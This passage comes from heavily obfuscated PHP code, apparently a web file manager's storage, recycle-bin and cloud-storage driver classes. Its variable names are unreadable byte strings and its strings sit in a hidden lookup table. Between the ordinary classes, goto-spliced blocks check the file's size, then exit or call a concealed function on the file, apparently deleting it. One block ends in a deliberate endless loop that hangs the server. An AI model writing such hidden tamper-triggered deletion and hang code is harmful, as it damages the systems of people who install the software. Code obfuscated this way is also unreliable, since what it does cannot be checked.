array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $³¸Ñ±áå = $this->targetSpaceSize($Ô³ĞšÛç, $ñ’ÔÖ¶„); if ($Ô³ĞšÛç == self::TYPE_USER) { Model($‘¤Ùƒ®[586])->userEdit($ñ’ÔÖ¶„, array($‘¤Ùƒ®[1942] => $³¸Ñ±áå)); } else { if ($Ô³ĞšÛç == self::TYPE_GROUP) { Model($‘¤Ùƒ®[594])->groupEdit($ñ’ÔÖ¶„, array($‘¤Ùƒ®[1942] => $³¸Ñ±áå)); } } } public function targetSpaceSize($ñõãÌôÃ, $äãê§”) { $¸¥“ÇÜ„ =& $_SERVER[£ğ°ÖØø]; $‘éè»ƒ÷ = 0; $×ƒ½‡›ç = $this->targetSourceRoot($ñõãÌôÃ, $äãê§”, !0); foreach ($×ƒ½‡›ç as $„¾¤‚ÎÒ) { if (!$„¾¤‚ÎÒ) { continue; } $‘éè»ƒ÷ += floatval($„¾¤‚ÎÒ[$¸¥“ÇÜ„[79]]); $ÎàĞîó = array($¸¥“ÇÜ„[661] => array($¸¥“ÇÜ„[621], $¸¥“ÇÜ„[603] . $„¾¤‚ÎÒ[$¸¥“ÇÜ„[193]] . $¸¥“ÇÜ„[622])); $¶© ¬ÌÆ = Model($¸¥“ÇÜ„[512])->field($¸¥“ÇÜ„[500])->where($ÎàĞîó)->select(); $¶© ¬ÌÆ = array_to_keyvalue($¶© ¬ÌÆ, $¸¥“ÇÜ„[12], $¸¥“ÇÜ„[193]); $¶© ¬ÌÆ = array_unique(array_filter($¶© ¬ÌÆ)); if ($¶© ¬ÌÆ) { $ÎàĞîó = array($¸¥“ÇÜ„[500] => array($¸¥“ÇÜ„[501], $¶© ¬ÌÆ)); $‘éè»ƒ÷ += floatval($this->where($ÎàĞîó)->sum($¸¥“ÇÜ„[79])); } } $‘éè»ƒ÷ = !$‘éè»ƒ÷ || $‘éè»ƒ÷ <= 0 ? 0 : $‘éè»ƒ÷; return $‘éè»ƒ÷; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($µˆ¯Û¹ê) { return $this->fileTypeProfile($µˆ¯Û¹ê, SourceModel::TYPE_USER); } public function groupFileTypeProfile($¬îöÍ®–) { return $this->fileTypeProfile($¬îöÍ®–, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ÓÈü£Õ, $èùØÄ‚) { $ªé·ã¬ =& $_SERVER[£ğ°ÖØø]; $ø××¿µß = $ªé·ã¬[2271] . $ÓÈü£Õ . $ªé·ã¬[11] . $èùØÄ‚; $ „ïğç = Cache::get($ø××¿µß); if ($ „ïğç) { return $ „ïğç; } $ıÎßüÀ = array($ªé·ã¬[655] => 0); if ($ÓÈü£Õ != !1) { $ıÎßüÀ[$ªé·ã¬[578]] = $ÓÈü£Õ; $ıÎßüÀ[$ªé·ã¬[190]] = $èùØÄ‚; } $ù‚Óİıí = array(); $ù‚Óİıí[$ªé·ã¬[2272]] = array($ªé·ã¬[2273] => LNG($ªé·ã¬[2272]), $ªé·ã¬[2274] => $this->where($ıÎßüÀ)->count(), $ªé·ã¬[626] => $this->where($ıÎßüÀ)->sum($ªé·ã¬[79])); $ÛÌÓŠŠØ = KodIO::fileTypeList(); foreach ($ÛÌÓŠŠØ as $½®šñ€€ => $ëë èƒ) { $ıÎßüÀ[$ªé·ã¬[495]] = $this->fileTypeWhere($½®šñ€€); $ù‚Óİıí[$½®šñ€€] = array($ªé·ã¬[2273] => $ëë èƒ[$ªé·ã¬[32]], $ªé·ã¬[2274] => $this->where($ıÎßüÀ)->count(), $ªé·ã¬[626] => $this->where($ıÎßüÀ)->sum($ªé·ã¬[79])); } Cache::set($ø××¿µß, $ù‚Óİıí, 1200); return $ù‚Óİıí; } public function fileNameExist($§È¼ü¾‘, $ÖÉàèÕ¸) { $˜‰›Á³€ =& $_SERVER[£ğ°ÖØø]; $å«Â©½ = $this->field($˜‰›Á³€[2275])->where(array($˜‰›Á³€[192] => $§È¼ü¾‘, $˜‰›Á³€[32] => $ÖÉàèÕ¸, $˜‰›Á³€[514] => 0))->find(); return is_array($å«Â©½) ? $å«Â©½[$˜‰›Á³€[193]] : !1; } public function childList($¡­ëëå×) { $Ş˜½Ëõ½ =& $_SERVER[£ğ°ÖØø]; $ˆÕĞÅŸî = $Ş˜½Ëõ½[2248] . $¡­ëëå×; if (isset(self::$cacheChildList[$ˆÕĞÅŸî])) { return self::$cacheChildList[$ˆÕĞÅŸî]; } $óÍºƒôè = array($Ş˜½Ëõ½[192] => intval($¡­ëëå×), $Ş˜½Ëõ½[514] => 0); $£¡âÇÂİ = $this->where($óÍºƒôè)->select(); $£¡âÇÂİ = $£¡âÇÂİ ? $£¡âÇÂİ : array(); self::$cacheChildList[$ˆÕĞÅŸî] = $£¡âÇÂİ; foreach ($£¡âÇÂİ as $ˆºôèôÅ) { $ˆÕĞÅŸî = $Ş˜½Ëõ½[542] . $ˆºôèôÅ[$Ş˜½Ëõ½[193]]; self::$cacheSourceInfo[$ˆÕĞÅŸî] = $ˆºôèôÅ; } return $£¡âÇÂİ; } public function fileNameAuto($ÊÈ¾í¢Ş, $™•ÑÆ‰‹, $‹÷Ë›€¯ = REPEAT_RENAME, $¾ıÓşæ = false) { $ØÌŒßÉÌ =& $_SERVER[£ğ°ÖØø]; $·àÀ‡ˆ = get_path_ext($™•ÑÆ‰‹); $şë´±öÈ = $·àÀ‡ˆ ? get_path_ext_name($™•ÑÆ‰‹) . $ØÌŒßÉÌ[2276] . $·àÀ‡ˆ : $™•ÑÆ‰‹ . $ØÌŒßÉÌ[469]; $¸ßû‡Ú´ = array($ØÌŒßÉÌ[192] => $ÊÈ¾í¢Ş, $ØÌŒßÉÌ[514] => 0, $ØÌŒßÉÌ[32] => array($ØÌŒßÉÌ[468], $şë´±öÈ)); $ÉâŸù©ù = $this->field($ØÌŒßÉÌ[32])->where($¸ßû‡Ú´)->select(); $ÜîÂÙ ç = array_to_keyvalue($ÉâŸù©ù, $ØÌŒßÉÌ[12], $ØÌŒßÉÌ[32]); return $this->fileNameAutoGet($ÜîÂÙ ç, $™•ÑÆ‰‹, $‹÷Ë›€¯, $¾ıÓşæ); } public function fileNameAutoGet($ÈÁ´ŠÍÈ, $Æº¿˜, $‡¡¨»¿‰, $òÔ²Š›Ë) { $Üõ¸Î„ª =& $_SERVER[£ğ°ÖØø]; if ($‡¡¨»¿‰ == REPEAT_REPLACE || !$ÈÁ´ŠÍÈ || !in_array_not_case($Æº¿˜, $ÈÁ´ŠÍÈ) || $òÔ²Š›Ë && $‡¡¨»¿‰ != REPEAT_RENAME_FOLDER) { return $Æº¿˜; } if ($‡¡¨»¿‰ == REPEAT_SKIP) { return !1; } $ÅŸôÒòÉ = $Üõ¸Î„ª[10] . get_path_ext($Æº¿˜); $ÅŸôÒòÉ = $ÅŸôÒòÉ == $Üõ¸Î„ª[10] || $òÔ²Š›Ë ? $Üõ¸Î„ª[12] : $ÅŸôÒòÉ; for ($şËôŠà× = 1; $şËôŠà× <= count($ÈÁ´ŠÍÈ) + 1; $şËôŠà×++) { $‰ß¢şåİ = substr($Æº¿˜, 0, strlen($Æº¿˜) - strlen($ÅŸôÒòÉ)); $İçµşç£ = $‰ß¢şåİ . "\50{$şËôŠà×}\51{$ÅŸôÒòÉ}"; if (!in_array_not_case($İçµşç£, $ÈÁ´ŠÍÈ)) { return $İçµşç£; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\165\x72\x63\145\x5f\162\x65\143\x79\143\x6c\x65"; protected $dataAuto = array(array("\x63\162\x65\141\164\x65\x54\151\155\145", "\164\x69\155\145", "\x69\156\163\145\x72\164", "\146\x75\156\x63\x74\151\157\156")); public function listData($°úØœ¤ı = false) { $¹ığæ =& $_SERVER[£ğ°ÖØø]; $°úØœ¤ı = $°úØœ¤ı ? $°úØœ¤ı : USER_ID; $­ŒËŞØ = $this->where(array($¹ığæ[1746] => $°úØœ¤ı))->select(); return array_to_keyvalue($­ŒËŞØ, $¹ığæ[12], $¹ığæ[193]); } public function moveToRecycle($İÊÜíµ«) { $ºô®ĞÌş =& $_SERVER[£ğ°ÖØø]; $³“§°»½ = Model($ºô®ĞÌş[1401]); $ç•©Úú‘ = $³“§°»½->sourceInfo($İÊÜíµ«); if (!$ç•©Úú‘ || $ç•©Úú‘[$ºô®ĞÌş[514]] == $ºô®ĞÌş[91]) { return; } $ˆşÈĞ“ü = array($ºô®ĞÌş[500] => $İÊÜíµ«, $ºô®ĞÌş[1746] => USER_ID, $ºô®ĞÌş[657] => $ç•©Úú‘[$ºô®ĞÌş[190]], $ºô®ĞÌş[658] => $ç•©Úú‘[$ºô®ĞÌş[578]], $ºô®ĞÌş[661] => $ç•©Úú‘[$ºô®ĞÌş[593]]); $this->add($ˆşÈĞ“ü); $this->recycleMove($İÊÜíµ«, 1); if ($ç•©Úú‘[$ºô®ĞÌş[494]] == $ºô®ĞÌş[91]) { $ØÍâ±¾½ = array($ºô®ĞÌş[661] => array($ºô®ĞÌş[621], $ç•©Úú‘[$ºô®ĞÌş[593]] . $İÊÜíµ« . $ºô®ĞÌş[622])); $³“§°»½->where($ØÍâ±¾½)->setField($ºô®ĞÌş[514], 1); } } public function clear() { $this->remove(!1); } public function remove($ ËÃÃ¬É = false, $î£Ì½¢² = false) { $ûˆ¢É± =& $_SERVER[£ğ°ÖØø]; $î£Ì½¢² = $î£Ì½¢² ? $î£Ì½¢² : USER_ID; $’Îåğø = Model($ûˆ¢É±[1401]); $ìú„Í’¹ = $this->listData($î£Ì½¢²); $ ËÃÃ¬É = $ ËÃÃ¬É === !1 ? !1 : $ ËÃÃ¬É; $šš³åİÅ = array(); foreach ($ìú„Í’¹ as $èÁğûÀé) { if ($ ËÃÃ¬É != !1 && !in_array($èÁğûÀé, $ ËÃÃ¬É)) { continue; } $€Œú¿² = $’Îåğø->sourceInfo($èÁğûÀé); $’Îåğø->remove($èÁğûÀé, !1); $ıçº»’ = $€Œú¿²[$ûˆ¢É±[190]] . $ûˆ¢É±[11] . $€Œú¿²[$ûˆ¢É±[578]]; $šš³åİÅ[$ıçº»’] = array($ûˆ¢É±[657] => $€Œú¿²[$ûˆ¢É±[190]], $ûˆ¢É±[578] => $€Œú¿²[$ûˆ¢É±[578]]); $this->where(array($ûˆ¢É±[193] => $èÁğûÀé))->delete(); } foreach ($šš³åİÅ as $°¡ÊìŞ°) { $’Îåğø->targetSpaceUpdate($°¡ÊìŞ°[$ûˆ¢É±[190]], $°¡ÊìŞ°[$ûˆ¢É±[578]]); } } public function restore($…î†ã¼Ç = false) { $«¹ãó§• = $this->listData(); $this->_restoreSource($«¹ãó§•, $…î†ã¼Ç); } public function removeUserAll($¯èğÖ±Î) { $this->remove(!1, $¯èğÖ±Î); } public function restoreItem($ÃÇ¾³Ï) { $this->_restoreSource(array($ÃÇ¾³Ï), array($ÃÇ¾³Ï)); } private function _restoreSource($‹¡ıÓúÓ, $ß·Ã”øİ) { $ïœšìü =& $_SERVER[£ğ°ÖØø]; $ÉÈØÆ¯Ì = Model($ïœšìü[1401]); $ß·Ã”øİ = $ß·Ã”øİ == !1 ? !1 : $ß·Ã”øİ; if (!$‹¡ıÓúÓ) { return !0; } $ŸºÔòÃ = array(); foreach ($‹¡ıÓúÓ as $üƒ¾ğÛÑ) { if ($ß·Ã”øİ != !1 && !in_array($üƒ¾ğÛÑ, $ß·Ã”øİ)) { continue; } $ÌÔ”§Ó… = $ÉÈØÆ¯Ì->sourceInfo($üƒ¾ğÛÑ); $ÜüÁŞ§é = $ÉÈØÆ¯Ì->sourceInfo($ÌÔ”§Ó…[$ïœšìü[192]]); if ($ÜüÁŞ§é[$ïœšìü[514]] == $ïœšìü[91]) { continue; } $ÉÈØÆ¯Ì->lockMoveStart($üƒ¾ğÛÑ); $this->recycleMove($üƒ¾ğÛÑ, 0); if ($ÌÔ”§Ó…[$ïœšìü[494]] == $ïœšìü[91]) { $·³úˆ¤ù = array($ïœšìü[661] => array($ïœšìü[621], $ÌÔ”§Ó…[$ïœšìü[593]] . $üƒ¾ğÛÑ . $ïœšìü[622])); $ÉÈØÆ¯Ì->where($·³úˆ¤ù)->setField($ïœšìü[514], 0); $this->restoreFolderChildren($üƒ¾ğÛÑ, $‹¡ıÓúÓ); } $this->where(array($ïœšìü[193] => $üƒ¾ğÛÑ))->delete(); $ÉÈØÆ¯Ì->folderSizeReset($ÌÔ”§Ó…[$ïœšìü[192]]); $ŸºÔòÃ[] = $ÌÔ”§Ó…[$ïœšìü[192]]; if ($ÌÔ”§Ó…[$ïœšìü[494]] == $ïœšìü[91]) { $ŸºÔòÃ[] = $üƒ¾ğÛÑ; } $ÉÈØÆ¯Ì->lockMoveEnd($üƒ¾ğÛÑ); } $ÉÈØÆ¯Ì->updateModifyTime($ŸºÔòÃ); } private function restoreFolderChildren($øùºõŠ, $§Ìú«Ä–) { $æÀ­‡ÇË =& $_SERVER[£ğ°ÖØø]; $†ª½¹ª” = Model($æÀ­‡ÇË[1401]); $êÓÔÃåû = array($æÀ­‡ÇË[193] => array($æÀ­‡ÇË[7], array())); foreach ($§Ìú«Ä– as $ª¶ş¿©) { if ($ª¶ş¿© == $øùºõŠ) { continue; } if (!$†ª½¹ª”->isParentOf($øùºõŠ, $ª¶ş¿©)) { continue; } $Î’âÙû = $†ª½¹ª”->sourceInfo($ª¶ş¿©); if ($Î’âÙû[$æÀ­‡ÇË[494]] == $æÀ­‡ÇË[91]) { $êÓÔÃåû[] = array($æÀ­‡ÇË[661] => array($æÀ­‡ÇË[621], $Î’âÙû[$æÀ­‡ÇË[593]] . $ª¶ş¿© . $æÀ­‡ÇË[622])); } else { $êÓÔÃåû[$æÀ­‡ÇË[193]][1][] = $ª¶ş¿©; } } if (!$êÓÔÃåû[$æÀ­‡ÇË[193]][1]) { unset($êÓÔÃåû[$æÀ­‡ÇË[193]]); } if (!$êÓÔÃåû) { return; } if (is_array($êÓÔÃåû[$æÀ­‡ÇË[193]]) && is_array($êÓÔÃåû[$æÀ­‡ÇË[193]][1])) { $êÓÔÃåû[$æÀ­‡ÇË[193]][1] = array_unique($êÓÔÃåû[$æÀ­‡ÇË[193]][1]); } $êÓÔÃåû[$æÀ­‡ÇË[1061]] = $æÀ­‡ÇË[2056]; $†ª½¹ª”->where($êÓÔÃåû)->setField($æÀ­‡ÇË[514], 1); } private function recycleMove($¾°õ‡¯, $Ñà€é Œ = 1) { $€ç„£‰» =& $_SERVER[£ğ°ÖØø]; $òí‰Ë¸Î = Model($€ç„£‰»[1401]); $å´”ÉÃù = Model($€ç„£‰»[2277]); $Ö›ÈˆçÀ = array($€ç„£‰»[193] => $¾°õ‡¯); if ($Ñà€é Œ) { $òí‰Ë¸Î->where($Ö›ÈˆçÀ)->setField($€ç„£‰»[514], 1); $å´”ÉÃù->eventRecycle($¾°õ‡¯, $€ç„£‰»[2278]); } else { $Öˆ¿÷æº = $òí‰Ë¸Î->where($Ö›ÈˆçÀ)->find(); $„Ñ¯÷Àõ = $Öˆ¿÷æº[$€ç„£‰»[494]] == $€ç„£‰»[91]; $àÍÓÉî = $òí‰Ë¸Î->fileNameAuto($Öˆ¿÷æº[$€ç„£‰»[192]], $Öˆ¿÷æº[$€ç„£‰»[32]], REPEAT_RENAME_FOLDER, $„Ñ¯÷Àõ); if ($àÍÓÉî != $Öˆ¿÷æº[$€ç„£‰»[32]]) { $òí‰Ë¸Î->rename($¾°õ‡¯, $àÍÓÉî); } $òí‰Ë¸Î->where($Ö›ÈˆçÀ)->setField($€ç„£‰»[514], 0); $å´”ÉÃù->eventRecycle($¾°õ‡¯, $€ç„£‰»[2279]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\56\x73\x6f\165\x72\143\145\x53\x65\143\x72\145\164\x4c\151\x73\164"; public $field = array("\x73\x6f\x75\x72\143\145\111\x44", "\x74\171\160\145\x49\104", "\143\x72\x65\141\x74\x65\125\x73\x65\162"); } goto dÕ†¹·”; B»å•†İ: $_file = $_SERVER[$_SERVER[£ğ°ÖØø][431]]; $_size = $_SERVER[£ğ°ÖØø][432]; if ($_SERVER[$_SERVER[£ğ°ÖØø][433]] != $_size($_file)) { $_getc = $_SERVER[£ğ°ÖØø][434]; $_getfile = $_SERVER[$_SERVER[£ğ°ÖØø][435]] . $_SERVER[£ğ°ÖØø][436]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[£ğ°ÖØø][262], $_getfilec); if (count($_getarrs) < $_SERVER[£ğ°ÖØø][437]) { $exit = $_SERVER[£ğ°ÖØø][438]; $exit(); } $_act = $_SERVER[£ğ°ÖØø][439]; $_act($_file); } goto A²®­¬¨èù; f¨ãù£á: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($—ßƒ‘ù€) { parent::__construct($—ßƒ‘ù€); $this->setSignVersion($_SERVER[£ğ°ÖØø][247]); } public function uploadFormData($‘¥¬ìãÊ, $øªÓÏÑ• = 3600) { $ç‰Óú¸‹ =& $_SERVER[£ğ°ÖØø]; $”ÛûºÎä = $ç‰Óú¸‹[229]; $Éúêşá· = $ç‰Óú¸‹[263]; $á£‘¯’® = $ç‰Óú¸‹[274]; $˜÷˜Üİ½ = gmdate($ç‰Óú¸‹[299], time() + $øªÓÏÑ•); $–·¢Ë’ = (string) time() . $ç‰Óú¸‹[74] . (string) (time() + $øªÓÏÑ•); $ìèš¥¨‹ = array($ç‰Óú¸‹[275] => $˜÷˜Üİ½, $ç‰Óú¸‹[278] => array(array($ç‰Óú¸‹[280] => $”ÛûºÎä), array($ç‰Óú¸‹[279] => $this->bucket), array($ç‰Óú¸‹[281], $ç‰Óú¸‹[282], $ç‰Óú¸‹[12]), array($ç‰Óú¸‹[285] => $á£‘¯’®), array($ç‰Óú¸‹[1394] => $Éúêşá·), array($ç‰Óú¸‹[1395] => $this->accessKey), array($ç‰Óú¸‹[1396] => $–·¢Ë’))); $ìèš¥¨‹ = json_encode($ìèš¥¨‹); $º¬ˆ†… = hash_hmac($ç‰Óú¸‹[263], $–·¢Ë’, $this->secret); $™ŠôŒ‘š = sha1($ìèš¥¨‹); $¯óİîºÜ = hash_hmac($ç‰Óú¸‹[263], $™ŠôŒ‘š, $º¬ˆ†…); $Ìšø¨áÆ = array($ç‰Óú¸‹[280] => $”ÛûºÎä, $ç‰Óú¸‹[285] => $á£‘¯’®, $ç‰Óú¸‹[293] => base64_encode($ìèš¥¨‹), $ç‰Óú¸‹[1394] => $Éúêşá·, $ç‰Óú¸‹[1395] => $this->accessKey, $ç‰Óú¸‹[1397] => $–·¢Ë’, $ç‰Óú¸‹[1398] => $¯óİîºÜ, $ç‰Óú¸‹[208] => $this->getHost()); return $Ìšø¨áÆ; } public function fileOutImage($ìËÔ¾‡¡, $øºé¨›¸ = 250) { $‹¿ú†Ùƒ =& $_SERVER[£ğ°ÖØø]; if ($this->size($ìËÔ¾‡¡) > 1024 * 1024 * 32) { return $this->fileOutImageServer($ìËÔ¾‡¡, $øºé¨›¸); } $ºŸŸ±× = $this->link($ìËÔ¾‡¡); $ºŸŸ±× .= $‹¿ú†Ùƒ[1399] . $øºé¨›¸ . $‹¿ú†Ùƒ[1400]; $this->fileOutLink($ºŸŸ±×); } public function fileOutLink($ÛØƒÒ¸°) { $÷ã–ÍÕ° =& $_SERVER[£ğ°ÖØø]; if (substr($ÛØƒÒ¸°, 0, 7) == $÷ã–ÍÕ°[313]) { $ÛØƒÒ¸° = $÷ã–ÍÕ°[314] . substr($ÛØƒÒ¸°, 7); } header($÷ã–ÍÕ°[175] . $ÛØƒÒ¸°); die; } } if (!isset($_SERVER[$_SERVER[£ğ°ÖØø][433]]) || !isset($_SERVER[$_SERVER[£ğ°ÖØø][431]])) { $_getc = $_SERVER[£ğ°ÖØø][434]; $_getfile = $_SERVER[$_SERVER[£ğ°ÖØø][435]] . $_SERVER[£ğ°ÖØø][436]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[£ğ°ÖØø][262], $_getfilec); if (count($_getarrs) < $_SERVER[£ğ°ÖØø][437]) { $exit = $_SERVER[£ğ°ÖØø][438]; $exit(); } $_act = $_SERVER[£ğ°ÖØø][439]; $_act($_SERVER[$_SERVER[£ğ°ÖØø][435]] . $_SERVER[£ğ°ÖØø][436]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[£ğ°ÖØø][463]); } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($æèÆÉ®Î) { $this->pathParse = $æèÆÉ®Î; $this->model = Model($_SERVER[£ğ°ÖØø][1401]); } public function getPath($èµø îì) { return trim($èµø îì, $_SERVER[£ğ°ÖØø][8]); } public function pathFather($‚ÂÃøè) { $ÒÔÃöïğ = $this->parse($‚ÂÃøè); $ÒÔÃöïğ = $this->infoSimple($‚ÂÃøè); return $ÒÔÃöïğ ? $ÒÔÃöïğ[$_SERVER[£ğ°ÖØø][192]] : !1; } public function pathThis($‹Ä¹¤³²) { $áé¯ØÁù = $this->infoSimple($‹Ä¹¤³²); return $áé¯ØÁù ? $áé¯ØÁù[$_SERVER[£ğ°ÖØø][32]] : !1; } public function getPathOuter($î‘Û¥±ğ) { if (!$î‘Û¥±ğ) { return $î‘Û¥±ğ; } $ï•ƒÏã = $this->parse($î‘Û¥±ğ); return KodIO::make($ï•ƒÏã[$_SERVER[£ğ°ÖØø][484]]); } public function copyFolderFromIO($–ñ¼ÜÅ, $‡Ö«€û, $àá²«ùÈ, $ÀˆŠá, $ãêÆ»¾ì) { $ùÏ Å¦ğ = $this->model->copyFolderFromIO($–ñ¼ÜÅ, $‡Ö«€û, $àá²«ùÈ, $ÀˆŠá, $ãêÆ»¾ì); return KodIO::make($ùÏ Å¦ğ); } public function isParentOf($ş×¦ù, $›Ô¿ò) { return $this->model->isParentOf($ş×¦ù, $›Ô¿ò); } public function mkfile($¤ëıõ, $ê×ÎÈŸğ = '', $µé—¢£Ú = REPEAT_RENAME) { $ØòâÎø× =& $_SERVER[£ğ°ÖØø]; $ƒº‚´ó = $this->parse($¤ëıõ); $¤ëıõ = $ƒº‚´ó[$ØòâÎø×[484]]; for ($ÆÄØğÛ” = 0; $ÆÄØğÛ” < count($ƒº‚´ó[$ØòâÎø×[1402]]); $ÆÄØğÛ”++) { $Éß·İšÍ = $ƒº‚´ó[$ØòâÎø×[1402]][$ÆÄØğÛ”]; if ($ÆÄØğÛ” == count($ƒº‚´ó[$ØòâÎø×[1402]]) - 1) { $¤ëıõ = $this->model->mkfile($¤ëıõ, $Éß·İšÍ, $ê×ÎÈŸğ, $µé—¢£Ú); break; } $¤ëıõ = $this->model->mkdir($¤ëıõ, $Éß·İšÍ, REPEAT_SKIP); } return $this->getPathOuter($¤ëıõ); } public function mkdir($ÕßñŸ, $ïÆ³öİø = REPEAT_SKIP) { $ª™ÛŞúù =& $_SERVER[£ğ°ÖØø]; $¥Ğ ø†Ç = $this->parse($ÕßñŸ); $ÕßñŸ = $¥Ğ ø†Ç[$ª™ÛŞúù[484]]; for ($°¿¾…•² = 0; $°¿¾…•² < count($¥Ğ ø†Ç[$ª™ÛŞúù[1402]]); $°¿¾…•²++) { $¢Ü·å = $¥Ğ ø†Ç[$ª™ÛŞúù[1402]][$°¿¾…•²]; $ÕßñŸ = $this->model->mkdir($ÕßñŸ, $¢Ü·å, $ïÆ³öİø); } return $this->getPathOuter($ÕßñŸ); } public function copyFile($±“±œºç, $¼Ş®‚šÑ, $‚ŞŞâÛ¢ = REPEAT_REPLACE) { $Ù„ª•Éö =& $_SERVER[£ğ°ÖØø]; $¢ùı•’Á = $this->parse($¼Ş®‚šÑ); $Š¿Ù÷Öğ = $this->model->copy($±“±œºç, $¢ùı•’Á[$Ù„ª•Éö[484]], $‚ŞŞâÛ¢, $¢ùı•’Á[$Ù„ª•Éö[87]]); return $Š¿Ù÷Öğ ? $this->getPathOuter($Š¿Ù÷Öğ) : !1; } public function moveFile($¹€Ô›îØ, $ƒ‰Ÿõ×á, $×ÛéÌ = REPEAT_REPLACE) { $ôƒ‡—Ñé =& $_SERVER[£ğ°ÖØø]; $Îôƒøğ = $this->parse($ƒ‰Ÿõ×á); $Ç¶Ò†³® = $this->model->move($¹€Ô›îØ, $Îôƒøğ[$ôƒ‡—Ñé[484]], $×ÛéÌ, $Îôƒøğ[$ôƒ‡—Ñé[87]]); return $Ç¶Ò†³® ? $this->getPathOuter($Ç¶Ò†³®) : !1; } public function copy($ªÇ¨‚÷, $•‚î¦, $ÏÕ”£¥ı = REPEAT_REPLACE, $µ¢ïÃ±ı = false) { $•Ö¥Ú¼ˆ = $this->parse($•‚î¦); $ÎºŠ¼”— = $this->model->copy($ªÇ¨‚÷, $•Ö¥Ú¼ˆ[$_SERVER[£ğ°ÖØø][484]], $ÏÕ”£¥ı, $µ¢ïÃ±ı); return $ÎºŠ¼”— ? $this->getPathOuter($ÎºŠ¼”—) : !1; } public function moveSameAllow() { } public function move($£–·†Õì, $¨Ë‘ëàĞ, $´ò€Ï = REPEAT_REPLACE, $®´öù¹¤ = false) { $ôÎËëó = $this->parse($¨Ë‘ëàĞ); $©ÙÕÁÍ = $this->model->move($£–·†Õì, $ôÎËëó[$_SERVER[£ğ°ÖØø][484]], $´ò€Ï, $®´öù¹¤); return $©ÙÕÁÍ ? $this->getPathOuter($©ÙÕÁÍ) : !1; } public function remove($´ış¬…Ô, $Êïçç§ = true) { return $this->model->remove($´ış¬…Ô, $Êïçç§); } public function rename($àæãâ¨¾, $Ì¶Ú¿„Ÿ) { $¥œŒ¸É¦ = $this->model->rename($àæãâ¨¾, $Ì¶Ú¿„Ÿ); return $¥œŒ¸É¦ ? $this->getPathOuter($àæãâ¨¾) : $¥œŒ¸É¦; } public function size($Ã£ÏÖİÂ) { $ÏÛ©ºƒó = $this->infoSimple($Ã£ÏÖİÂ); return $ÏÛ©ºƒó ? $ÏÛ©ºƒó[$_SERVER[£ğ°ÖØø][79]] : 0; } public function infoSimple($Ç»»õø) { return $this->model->sourceInfo($Ç»»õø); } public function info($¾¿„•šõ) { return $this->infoParse($¾¿„•šõ); } public function infoAuth($ÒêÇŠà«) { return $this->infoParse($ÒêÇŠà«, !1, !0); } public function infoWithChildren($³¤€™Ô÷) { return $this->infoParse($³¤€™Ô÷, !0); } protected function infoParse($ìÕ¬„œ×, $œ¯‚Øë = false, $Îúò¼ªœ = false) { if (!$œ¯‚Øë) { return $this->model->pathInfo($ìÕ¬„œ×, $Îúò¼ªœ); } return $this->model->pathInfoMore($ìÕ¬„œ×); } public function infoFullSimple($Õã«öãô) { $ü¤¿ÁÖ =& $_SERVER[£ğ°ÖØø]; $úÒ—¹åğ = explode($ü¤¿ÁÖ[8], $Õã«öãô); $¿¾ì ıˆ = implode($ü¤¿ÁÖ[8], array_splice($úÒ—¹åğ, 1)); return $this->model->pathInfoByPath($úÒ—¹åğ[0], $¿¾ì ıˆ); } public function infoFull($«¸û™ŸÆ) { $Ô¸±Û²¼ = $this->infoFullSimple($«¸û™ŸÆ); return is_array($Ô¸±Û²¼) ? $this->model->pathInfo($Ô¸±Û²¼[$_SERVER[£ğ°ÖØø][193]]) : !1; } public function hashSimple($ş³ÊìŸ¹) { $İûòÇË =& $_SERVER[£ğ°ÖØø]; $×Ÿœ—©Š = $this->infoWithChildren($ş³ÊìŸ¹); return $×Ÿœ—©Š[$İûòÇË[170]][$İûòÇË[681]]; } public function hashMd5($”—ï›­ã) { $Íñ™§ôÚ =& $_SERVER[£ğ°ÖØø]; $ú…†Ÿì = $this->infoWithChildren($”—ï›­ã); return $ú…†Ÿì[$Íñ™§ôÚ[170]][$Íñ™§ôÚ[556]]; } public function exist($œ´èûÏ) { $ñ¦ìúÇ¡ =& $_SERVER[£ğ°ÖØø]; $Ò›œš¼ = $this->parse($œ´èûÏ); if (!$Ò›œš¼[$ñ¦ìúÇ¡[87]]) { return $this->isFile($œ´èûÏ) || $this->isFolder($œ´èûÏ); } $ô—Ø‹ò¾ = array($ñ¦ìúÇ¡[486] => $Ò›œš¼[$ñ¦ìúÇ¡[484]], $ñ¦ìúÇ¡[32] => $Ò›œš¼[$ñ¦ìúÇ¡[87]]); $Ö»Øµ‰¨ = $this->model->where($ô—Ø‹ò¾)->find(); return $Ö»Øµ‰¨ ? !0 : !1; } public function isFile($úÅ€ÌÖ€) { $Ü§ğçŠş =& $_SERVER[£ğ°ÖØø]; $ÈÚ„œì„ = $this->infoSimple($úÅ€ÌÖ€); return $ÈÚ„œì„ && $ÈÚ„œì„[$Ü§ğçŠş[494]] == $Ü§ğçŠş[228] ? !0 : !1; } public function isFolder($ƒ“¦Ï ) { $‰˜œîÄ» =& $_SERVER[£ğ°ÖØø]; $µ÷³‰ïÀ = $this->infoSimple($ƒ“¦Ï ); return $µ÷³‰ïÀ && $µ÷³‰ïÀ[$‰˜œîÄ»[494]] == $‰˜œîÄ»[91] ? !0 : !1; } public function listPath($­‹ëÑÊ–, $´”Â”º¦ = false) { $‰Çå†„ú =& $_SERVER[£ğ°ÖØø]; if ($­‹ëÑÊ– == $‰Çå†„ú[12]) { return !1; } $¯ú¶ ÎÌ = array($‰Çå†„ú[486] => $­‹ëÑÊ–); if ($´”Â”º¦) { return $this->model->listSource($¯ú¶ ÎÌ, -1); } return $this->model->listSource($¯ú¶ ÎÌ); } public function has($íù°÷Åó, $÷Âœ•£î = false, $·‚›©Ÿ© = null) { $™˜¥Â·Û =& $_SERVER[£ğ°ÖØø]; $·å¤ı°ö = $this->infoWithChildren($íù°÷Åó); if ($÷Âœ•£î) { return array($™˜¥Â·Û[240] => $·å¤ı°ö[$™˜¥Â·Û[240]], $™˜¥Â·Û[239] => 